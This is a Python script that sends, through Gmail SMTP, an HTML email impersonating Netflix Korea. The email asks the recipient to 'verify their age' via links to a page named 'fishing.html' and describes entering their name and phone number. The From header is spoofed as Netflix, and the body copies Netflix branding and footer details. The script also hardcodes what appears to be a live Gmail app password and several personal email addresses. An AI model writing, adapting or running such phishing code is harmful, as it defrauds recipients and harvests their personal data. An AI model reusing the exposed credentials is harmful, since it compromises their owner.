import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

# 이메일 설정
sender_email = "waveshare0906@gmail.com"  # 발신자 이메일 주소
sender_password = "lghulltgbhpaybcf"  # 발신자 이메일 비밀번호 또는 앱 비밀번호
recipient_email = "ahrim.lee@balc.co.kr"  # 수신자 이메일 주소

# HTML 내용 (email_template.html의 HTML 코드를 그대로 붙여넣기)
html_content = """
<!DOCTYPE html>
<html lang="ko">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>연령 인증 요청</title>
  </head>
  <body
    style="
      font-family: Arial, sans-serif;
      margin: 0;
      padding: 0;
      background-color: #f9f9f9;
    "
  >
    <div
      style="
        max-width: 600px;
        margin: 0 auto;
        background-color: #ffffff;
        border: 1px solid #e0e0e0;
      "
    >
      <!-- Netflix Logo -->
      <div
        style="
          padding-top: 20px;
          padding-bottom: 0px;
          margin-bottom: 0;
          text-align: center;
          cursor: pointer;
        "
      >
        <img
          src="https://i.imgur.com/tkd95Bq.jpeg"
          alt="Netflix Logo"
          style="height: 40px"
        />
      </div>

      <!-- Main Content -->
      <div style="padding: 20px 40px">
        <h1 style="font-size: 35px; color: #333; margin-bottom: 10px">
          연령을 인증해 주세요
        </h1>
        <p style="font-size: 16px; color: #555">장원 님, 안녕하세요.</p>
        <p style="font-size: 16px; color: #555">
          현재 연령 인증 시스템 도입으로 인해 Netflix에서 성인 등급의 동영상
          시청이 제한되어 있습니다.
          <a href="fishing.html" style="color: #e60914; text-decoration: none"
            >netflix.com/verifyage</a
          >
          페이지에서 본인이 19세 이상임을 인증해 주세요.
        </p>

        <!-- 인증하기 Button -->
        <div style="text-align: center; margin: 20px 0">
          <a
            href="fishing.html"
            style="
              display: inline-block;
              background-color: #e50914;
              color: #fff;
              text-decoration: none;
              font-size: 16px;
              padding: 15px 40px;
              border-radius: 4px;
              width: 100%;
              max-width: 440px;
              text-align: center;
            "
            >연령 인증하기</a
          >
        </div>

        <!-- 인증 절차 안내 -->
        <h2 style="font-size: 18px; color: #333; margin-bottom: 10px">
          연령 인증 절차는 아래와 같습니다.
        </h2>
        <ul style="font-size: 16px; color: #555; padding-left: 20px">
          <li>이동 통신사 계정에 등록된 이름을 입력하세요.</li>
          <li>
            전화번호는 모두 붙여서 입력하시거나 또는 대시(-)를 사용해
            입력하세요.
          </li>
          <li>
            입력하신 정보의 오류 횟수가 너무 많은 경우 에러 메시지가 뜨며,
            24시간 후에 다시 시도하셔야 합니다.
          </li>
        </ul>

        <p style="font-size: 16px; color: #555">
          도움이 필요하시면 언제든지 도와드리겠습니다.
          <a href="fishing.html" style="color: #e50914; text-decoration: none"
            >고객 센터</a
          >
          페이지에서 자세한 정보를 확인하시거나 직접 문의해 주세요.
        </p>

        <p style="font-size: 16px; color: #555; margin-top: 20px">
          넷플릭스 드림
        </p>
      </div>

      <hr style="border: none; border-top: 3px solid #000000; margin: 0" />

      <!-- Footer -->
      <div style="padding: 20px 40px; font-size: 14px; color: #777">
        <div style="display: flex" ;>
          <div style="margin-right: 20px; margin-left: 10px">
            <img
              src="https://i.imgur.com/tkd95Bq.jpeg"
              alt="Netflix Logo"
              style="height: 40px"
            />
          </div>
          <div>
            <p style="margin: 0">
              질문이 있으신가요? 00-308-321-0161 (수신자 부담) 번호로 문의해
              주세요. <br />
            </p>
            <p style="font-size: 10px; margin-bottom: 10px">
              넷플릭스서비시스코리아 유한회사
            </p>
            <p style="text-decoration: underline; cursor: pointer">
              알림 설정 <br />
              이용 약관 <br />
              개인정보 처리방침 <br />
              고객 센터
            </p>
            <p style="margin-bottom: 30px">
              본 이메일은 넷플릭스에서 [dr.jaylee@kakao.com] 주소로 넷플릭스
              회원님께 발송한 이메일입니다. <br />
              SRC: 606CF07E_a4c329ab-2ad5-4819-9b50-421a8ff3a353_ko_KR_EVO
            </p>
            <p style="margin: 0">© Netflix International B.V.</p>
          </div>
        </div>
      </div>
    </div>
  </body>
</html>

"""

# 이메일 메시지 생성
message = MIMEMultipart("alternative")
message["Subject"] = "연령 인증 요청"
message["From"] = "Netflix <waveshare0906@gmail.com>"
message["To"] = recipient_email

# HTML 내용 추가
mime_html = MIMEText(html_content, "html")
message.attach(mime_html)

# SMTP 서버 연결 및 이메일 전송
try:
    with smtplib.SMTP("smtp.gmail.com", 587) as server:
        server.starttls()
        server.login(sender_email, sender_password)  # Gmail 앱 비밀번호 사용
        server.sendmail(sender_email, recipient_email, message.as_string())
        print("HTML 이메일이 성공적으로 전송되었습니다!")
except Exception as e:
    print(f"이메일 전송 중 오류 발생: {e}")
